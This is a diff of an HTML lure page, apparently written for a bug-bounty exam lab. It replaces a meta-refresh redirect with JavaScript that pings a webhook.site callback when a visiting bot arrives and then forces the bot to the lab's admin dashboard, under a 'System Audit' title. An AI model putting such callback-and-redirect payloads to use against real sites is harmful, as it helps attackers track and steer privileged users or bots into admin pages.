@@ -1,16 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/admin/messages/69e7f547bee6d6b7c66432b6">
-    <title>Syncing...</title>
-</head>
+<head><title>System Audit</title></head>
 <body>
     <script>
-        // Backup JavaScript redirect if Meta Refresh is blocked
-        window.location.replace("https://bugbounty-exam.hashacademy.co/admin/messages/69e7f547bee6d6b7c66432b6");
+        const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";
+        const labUrl = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
+
+        // Step 1: Tell the webhook the bot arrived
+        fetch(webhook + "?status=bot_landed_on_github");
+
+        // Step 2: Force the bot to the dashboard
+        // We use window.location.replace to ensure it doesn't just 'stop'
+        setTimeout(() => {
+            window.location.replace(labUrl);
+        }, 500);
     </script>
-    <p>Redirecting to Secure Admin Portal...</p>
-    <img src="https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8?status=github_hit">
 </body>
 </html>
